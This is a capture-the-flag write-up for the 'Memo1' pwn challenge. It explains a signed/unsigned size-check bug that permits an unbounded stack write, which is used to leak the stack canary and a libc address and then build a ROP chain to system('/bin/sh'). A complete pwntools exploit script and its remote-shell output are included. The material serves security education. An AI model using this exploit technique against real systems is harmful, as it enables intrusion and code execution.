# Memo1

Category: `pwn`

Points: `174`

Solves: 53

Description:

> But Mike's program seems to have a bug, can you help find it？

---

## Part I

This binary continues off [`memo0`](memo0.md), where obviously the login flag has been removed. We move on to actual binary exploitation.

First we understand the menu:

```
$ ./memo1
===================Memo Login===================
Please enter your password: CTF_is_interesting_isn0t_it?
Login Success!
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:
```

Pretty straightforward, nothing but classic. Note that entering a wrong choice exits (`return`) the program. Note that there *is* a buffer, which means we can potentially overflow it. But the binary is hardened pretty intensely:

```
$ checksec memo1
[*] '[REDACTED]/memo1'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

---

## Part II

Now we explore the options one by one. Option 2 is a simple `puts`, and option 4 is a simple `memset` (which notably does not cover the whole buffer).

Option 1 brings us to the add function:

```c
__int64 __fastcall sub_1780(__int64 a1, unsigned int a2)
{
  int v3; // [rsp+1Ch] [rbp-4h]

  puts("What do you want to write in the memo:");
  if ( a2 > 0xFF )
    return 0LL;
  v3 = sub_170E(a2 + a1, 256 - a2);
  if ( v3 <= 0 )
    return 0LL;
  puts("Done!");
  return (unsigned int)v3;
}
```

```c
__int64 __fastcall sub_170E(__int64 a1, unsigned int a2)
{
  unsigned int i; // [rsp+1Ch] [rbp-4h]

  for ( i = 0; a2 > i; ++i )
  {
    read(0, (void *)((int)i + a1), 1uLL);
    if ( *(_BYTE *)((int)i + a1) == 10 )
    {
      *(_BYTE *)((int)i + a1) = 0;
      return i;
    }
  }
  return i;
}
```

Option 3 brings us to the edit function:

```c
unsigned __int64 __fastcall sub_17F2(__int64 a1, unsigned int a2)
{
  __int64 v3; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("How many characters do you want to change:");
  __isoc99_scanf("%lld", &v3);
  if ( a2 > v3 )
  {
    sub_170E(a1, v3);
    puts("Done!");
  }
  return v4 - __readfsqword(0x28u);
}
```

We can see that both functions utilise the same input function `sub_170E`. That function itself seems pretty regular, the input stops after a fixed number of bytes read or at the first newline, whichever comes first.

However, very quickly, the vulnerability jumps out straight at us:

```c
  __isoc99_scanf("%lld", &v3);
  if ( a2 > v3 )
```

Classic type mismatch. The program clearly expects `unsigned int`s, yet we are able to write an `int64` and it is being used for comparisons. The corresponding assembly is:

```asm
sub_17F2 proc near
...
mov     [rbp+var_1C], esi
...
lea     rax, [rbp+var_10]
mov     rsi, rax
lea     rax, aLld       ; "%lld"
mov     rdi, rax
mov     eax, 0
call    ___isoc99_scanf
mov     edx, [rbp+var_1C]
mov     rax, [rbp+var_10]
cmp     rdx, rax
jle     short loc_1873
```

Here `esi` -> `[rbp+var_1C]` -> `edx` is promoted to `rdx` before the *signed* comparison (`jle` instead of `jbe`) with `[rbp+var_10]` -> `rax` (fully controllable `int64`). And afterwards,

```asm
mov     rax, [rbp+var_10]
mov     edx, eax
mov     rax, [rbp+var_18]
mov     esi, edx
mov     rdi, rax
call    sub_170E
```

Our `[rbp+var_10]` is demoted back to `unsigned int` before being passed into the input function.

The implication is that an input "size" of `0xffffffffffffffff` is treated as -1 at the point of comparison and 4294967295 inside the input function.

---

## Part III

Now, what can we do with this unbounded read? Unfortunately we can't BOF into ROP into whatever just yet due to the protections. (But we're pretty close.)

The input function that we have is even better than a classic `gets`. In that, we are able to write however many characters we want into the buffer **without a terminating null byte**, as we can control exactly how many bytes are read.

Remember option 2 which is a simple `puts`?

Let's say our stack currently looks like this:

```
gef➤  b *0x555555555a1c
Breakpoint 1 at 0x555555555a1c
gef➤  r
...
===================Memo Login===================
Please enter your password: CTF_is_interesting_isn0t_it?
Login Success!
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:3
...
gef➤  tele -l 40 $rdi
0x007fffffffdf30│+0x0000: 0x0000160000005e ("^"?)        ← $rax, $rdi
0x007fffffffdf38│+0x0008: 0x0000000000000000
...
0x007fffffffe030│+0x0100: 0x0000000000000000
0x007fffffffe038│+0x0108: 0x79910315d72cc100
0x007fffffffe040│+0x0110: 0x0000000000000001     ← $rbp
...
```

Our goal should be to leak the stack canary first. For this, since the canary is located at `0x108`, we aim to write *exactly* `0x109` (265) bytes into the buffer (ignoring the predictable null byte at the start).

(Note that `0xffffffff00000109` is -4294967031)

```
gef➤  c
Continuing.
How many characters do you want to change:-4294967031
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||
Done!
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:3
...
gef➤  tele -l 40 $rdi
0x007fffffffdf30│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rax, $rdi
0x007fffffffdf38│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
...
0x007fffffffe030│+0x0100: 0x7c41414141414141
0x007fffffffe038│+0x0108: 0x79910315d72cc17c
0x007fffffffe040│+0x0110: 0x0000000000000001     ← $rbp
...
```

Now when we run option 2 (`puts`):

```
gef➤  c
Continuing.
How many characters do you want to change:1
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:2
Content:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||,�y
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:
```

We leaked the canary!

---

## Part IV

With this, the end is practically in sight. What's left is nothing but standard ROP. As mentioned near the beginning, the return is triggered through an invalid option.

```python
from pwn import *

e = context.binary = ELF('./memo1_patched')
libc = ELF('./libc.so.6')
p = e.process() if not args.REMOTE else remote('chall.geekctf.geekcon.top', 40311)

p.sendline(b'CTF_is_interesting_isn0t_it?')

def leak(offset):
    p.sendline(b'3')
    p.sendline(str(-4294967296+offset).encode()) # 0xffffffff00000000
    p.sendline(b'A'*(offset-2) + b'||')

    p.sendline(b'2')
    p.recvuntil(b'||')
    return p.recvline(keepends=False)

canary = u64(b'\0' + leak(0x108+1)[:7])
log.info(f'Canary: {hex(canary)}')

libc.address = u64(leak(0x118).ljust(8, b'\0')) - 0x29d90
log.info(f'Libc: {hex(libc.address)}')

rop = ROP(libc)
rop.call(rop.ret)
rop.call(libc.sym.system, [next(libc.search(b'/bin/sh\0'))])

p.sendline(b'3')
p.sendline(b'-1')
p.sendline(b'A'*0x108 + p64(canary) + b'B'*0x8 + rop.chain())
p.sendline(b'5')

p.interactive()
```

```
$ python3 solve.py REMOTE
[*] '[REDACTED]/memo1_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '[REDACTED]/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chall.geekctf.geekcon.top on port 40311: Done
[*] Canary: 0x4b94bcf10d74ba00
[*] Libc: 0x7f5971435000
[*] Loaded 219 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:How many characters do you want to change:Done!
===================Memo 1.0===================
1. Add  Memo
2. Show Memo
3. Edit Memo
4. Clean All
Your choice:Error Choice!
$ ls
flag
memo1
$ cat flag
flag{5t4ck_0v3rfl0w_1s_d4ng3r0u5_233}
```
